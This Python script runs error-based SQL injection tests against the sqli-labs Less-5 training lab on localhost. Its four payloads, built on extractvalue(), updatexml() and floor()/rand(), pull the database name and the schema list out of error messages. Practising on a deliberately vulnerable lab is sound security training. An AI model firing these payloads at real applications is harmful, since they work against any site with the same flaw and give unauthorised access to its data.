#!/usr/bin/env python3
import requests
from urllib.parse import quote

# Test Less-5 Double Query injection
base_url = "http://localhost/sqli-labs/Less-5/"

# 1. Test extractvalue() function
print("=== 1. extractvalue() Test ===")
payload1 = "1' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+"
url1 = f"{base_url}?id={quote(payload1)}"
try:
    r = requests.get(url1, timeout=5)
    if "XPATH" in r.text:
        print("✅ extractvalue() injection succeeded")
        # Extract data from error message
        error = r.text.split("XPATH syntax error:")[1].split("<")[0] if "XPATH syntax error:" in r.text else "Not found"
        print(f"Error message: {error.strip()}")
    else:
        print("❌ extractvalue() injection failed")
        print(f"Response: {r.text[:500]}")
except Exception as e:
    print(f"❌ Request failed: {e}")

print("\n=== 2. updatexml() Test ===")
payload2 = "1' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+"
url2 = f"{base_url}?id={quote(payload2)}"
try:
    r = requests.get(url2, timeout=5)
    if "XPATH" in r.text:
        print("✅ updatexml() injection succeeded")
        error = r.text.split("XPATH syntax error:")[1].split("<")[0] if "XPATH syntax error:" in r.text else "Not found"
        print(f"Error message: {error.strip()}")
    else:
        print("❌ updatexml() injection failed")
except Exception as e:
    print(f"❌ Request failed: {e}")

print("\n=== 3. floor() + rand() Test ===")
payload3 = "1' and (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+"
url3 = f"{base_url}?id={quote(payload3)}"
try:
    r = requests.get(url3, timeout=5)
    if "Duplicate entry" in r.text or "error" in r.text.lower():
        print("✅ floor() + rand() injection may have succeeded")
        print(f"Response snippet: {r.text[r.text.find('Duplicate'):r.text.find('Duplicate')+100] if 'Duplicate' in r.text else 'Not found'}")
    else:
        print("❌ floor() + rand() injection failed")
except Exception as e:
    print(f"❌ Request failed: {e}")

print("\n=== 4. Extract Database Information ===")
payload4 = "1' and extractvalue(1,concat(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata),0x7e))--+"
url4 = f"{base_url}?id={quote(payload4)}"
try:
    r = requests.get(url4, timeout=5)
    if "XPATH" in r.text:
        print("✅ Database extraction succeeded")
        error = r.text.split("XPATH syntax error:")[1].split("<")[0] if "XPATH syntax error:" in r.text else "Not found"
        print(f"Database list: {error.strip()}")
except Exception as e:
    print(f"❌ Request failed: {e}")

print("\nTest complete!")
